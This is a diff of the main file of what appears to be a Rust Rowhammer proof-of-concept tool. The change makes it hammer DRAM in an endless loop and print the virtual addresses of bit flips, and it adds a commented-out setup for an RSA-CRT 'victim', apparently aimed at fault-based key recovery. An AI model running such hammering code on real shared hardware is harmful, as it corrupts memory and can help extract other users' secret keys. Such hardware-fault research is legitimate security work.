@@ -1,6 +1,7 @@
 use bs_poc::memory::LinuxPageMap;
 use bs_poc::memory::Memory;
 use bs_poc::memory::VirtToPhysResolver;
+use bs_poc::victim::RsaCrt;
 use clap::Parser;
 
 use bs_poc::forge::Hammerer;
@@ -58,11 +59,16 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     info!("initialized hammerer");
 
     //RSA-CRT
-    //let mut rng = rand::thread_rng();
-    //let mut rsa = RsaCrt::new(&memory, &mut rng)?;
-    //let msg = b"hello world";
     //let sig = rsa.sign(msg);
     //let mut check = rsa.verify(msg, &sig);
+    /*let _init = |rsa: Option<RsaCrt>| {
+        if let Some(rsa) = rsa {
+            return rsa;
+        }
+        let mut rng = rand::thread_rng();
+        let mut r = RsaCrt::new(&memory, &mut rng).unwrap();
+        return r;
+    };*/
     info!("start hammering");
     let init = |_| {
         let seed = rand::random();
@@ -70,11 +76,18 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         seed
     };
     let check = |seed| memory.check::<StdRng>(mem_config, seed);
-
-    let result = hammerer.hammer(init, check)?;
-    println!(
-        "Flipped at run {} after {} attempts with seed {:?} at {:?}",
-        result.run, result.attempt, result.state, result.result,
-    );
-    Ok(())
+    loop {
+        let result = hammerer.hammer(init, check)?;
+        println!(
+            "Flipped at run {} after {} attempts with seed {:?} at {:?}",
+            result.run, result.attempt, result.state, result.result,
+        );
+        let virt_addrs: Vec<String> = result
+            .result
+            .iter()
+            .map(|bf| bf.dram_addr.to_virt(memory.addr, mem_config))
+            .map(|addr| format!("0x{:02X}", addr as usize))
+            .collect();
+        println!("Addresses with flips: {:?}", virt_addrs);
+    }
 }
